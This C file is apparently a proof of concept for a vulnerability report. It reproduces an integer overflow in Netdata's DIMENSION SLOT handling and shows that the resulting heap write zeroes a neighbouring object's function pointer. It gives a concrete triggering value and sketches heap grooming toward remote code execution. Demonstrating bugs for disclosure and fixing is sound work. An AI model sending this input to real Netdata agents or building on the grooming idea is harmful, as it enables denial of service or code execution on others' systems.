// SPDX-License-Identifier: GPL-3.0-or-later
//
// PROOF OF HEAP CORRUPTION (potential RCE) for the Netdata DIMENSION SLOT
// integer-overflow bug.
//
// This goes beyond "ASan aborts on the first OOB byte" and demonstrates that
// the unbounded initialization loop in pluginsd_rrddim_put_to_slot() performs a
// sequential heap write that *overwrites adjacent heap objects*, including a
// function pointer in a neighboring allocation. If that neighbor object were
// later used by the agent (its function pointer invoked), control flow would be
// hijacked -> this is the basis of the "potential RCE" classification.
//
// We reproduce the EXACT vulnerable arithmetic and loop. We then place a victim
// object on the heap immediately after the undersized array, run the real loop,
// catch the eventual SIGSEGV (the write runs off the end of the heap), and then
// show that the victim's function pointer and magic value were zeroed by the
// overflow BEFORE the crash.
//
// Build (plain libc malloc so writes land on real adjacent heap, no ASan
// redzones):
//   gcc -O0 -g -o poc_heap_corruption poc_heap_corruption.c
// Run:
//   ./poc_heap_corruption 0xaaaaaaaaaaaaaab
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#include <inttypes.h>

// ---- exact replicas of the real structures ----
struct pluginsd_rrddim { void *rda; void *rd; const char *id; };   // 24 bytes

typedef struct pluginsd_rrddim_array {
    int32_t refcount;
    size_t  size;
    struct pluginsd_rrddim entries[];   // flexible array member
} PRD_ARRAY;

// Victim object simulating ANY adjacent heap allocation that holds a callback.
// Netdata's heap is full of such structures (parser callbacks, RRDDIM, dispatch
// tables, etc.). If its fnptr is later called, zeroing it = control hijack.
typedef struct victim {
    uint64_t magic;        // sentinel to prove corruption
    void   (*fnptr)(void); // control-flow-relevant pointer
    char     name[16];
} VICTIM;

static sigjmp_buf g_jmp;
static volatile VICTIM *g_victim;

static void segv_handler(int sig) {
    (void)sig;
    siglongjmp(g_jmp, 1);
}

// exact replica of prd_array_create() arithmetic (callocz -> calloc(1,n))
static PRD_ARRAY *prd_array_create(size_t size) {
    size_t bytes = sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim); // OVERFLOWS
    PRD_ARRAY *arr = (PRD_ARRAY *)calloc(1, bytes);
    if(!arr) { fprintf(stderr,"[!] calloc(%zu) failed -> agent fatal()/DoS\n", bytes); exit(2); }
    arr->refcount = 1;
    arr->size = size;
    fprintf(stderr, "[*] prd_array_create(size=%zu) -> calloc %zu bytes at %p; arr->size=%zu\n",
            size, bytes, (void*)arr, arr->size);
    return arr;
}

static unsigned long long str2ull_encoded(const char *s) {
    if(s[0]=='0' && (s[1]=='x'||s[1]=='X')) return strtoull(s+2, NULL, 16);
    return strtoull(s, NULL, 10);
}

int main(int argc, char **argv) {
    const char *tok = (argc > 1) ? argv[1] : "0xaaaaaaaaaaaaaab";

    // 1) parse slot exactly like pluginsd_parse_rrd_slot()
    ssize_t slot = (ssize_t) str2ull_encoded(tok);
    if(slot < 0) slot = 0;
    size_t wanted_size = (size_t)slot;
    fprintf(stderr, "[*] DIMENSION SLOT:%s -> wanted_size=%zu\n", tok, wanted_size);

    // 2) the overflowing allocation
    PRD_ARRAY *new_arr = prd_array_create(wanted_size);

    // 3) place a victim object immediately after on the heap with a live callback
    VICTIM *victim = (VICTIM *)malloc(sizeof(VICTIM));
    victim->magic = 0xDEADBEEFCAFEF00DULL;
    victim->fnptr = (void(*)(void))(uintptr_t)0x4141414142424242ULL; // a "live" pointer
    strcpy(victim->name, "callback_obj");
    g_victim = victim;
    fprintf(stderr, "[*] victim object at %p (%+ld bytes from array end)\n",
            (void*)victim, (long)((char*)victim - ((char*)new_arr + sizeof(PRD_ARRAY) + 24)));
    fprintf(stderr, "[*] victim BEFORE: magic=0x%016" PRIx64 " fnptr=%p name='%s'\n",
            victim->magic, (void*)victim->fnptr, victim->name);

    // 4) run the EXACT init loop from pluginsd_rrddim_put_to_slot(); catch the crash
    signal(SIGSEGV, segv_handler);
    if(sigsetjmp(g_jmp, 1) == 0) {
        size_t current_size = 0;
        fprintf(stderr, "[*] running real init loop: for(i=%zu;i<%zu;i++) entries[i]={NULL,NULL,NULL}\n",
                current_size, wanted_size);
        for(size_t i = current_size; i < wanted_size; i++) {
            new_arr->entries[i].rda = NULL;
            new_arr->entries[i].rd  = NULL;
            new_arr->entries[i].id  = NULL;
        }
        fprintf(stderr, "[!] loop completed without crash (unexpected)\n");
    } else {
        fprintf(stderr, "[*] caught SIGSEGV: the loop ran off the end of the heap (wild write)\n");
    }

    // 5) prove the adjacent victim object was corrupted by the overflow
    fprintf(stderr, "[*] victim AFTER : magic=0x%016" PRIx64 " fnptr=%p name='%s'\n",
            g_victim->magic, (void*)g_victim->fnptr, (char*)g_victim->name);

    if(g_victim->magic == 0 && g_victim->fnptr == NULL) {
        fprintf(stderr,
            "\n[+] HEAP CORRUPTION CONFIRMED: adjacent object fully zeroed by the overflow.\n"
            "    - victim->fnptr was 0x4141414142424242, now NULL.\n"
            "    - In the agent, a neighboring object's function pointer would be\n"
            "      overwritten; with heap grooming an attacker controls which object\n"
            "      lands here. Sequential writes also smash glibc chunk headers.\n"
            "    => memory corruption with potential for control-flow hijack (RCE).\n");
        return 0;
    }

    fprintf(stderr, "\n[?] victim not (fully) overwritten in this run; heap layout dependent. "
                    "Re-run; the wild write is deterministic, only the neighbor distance varies.\n");
    return 1;
}
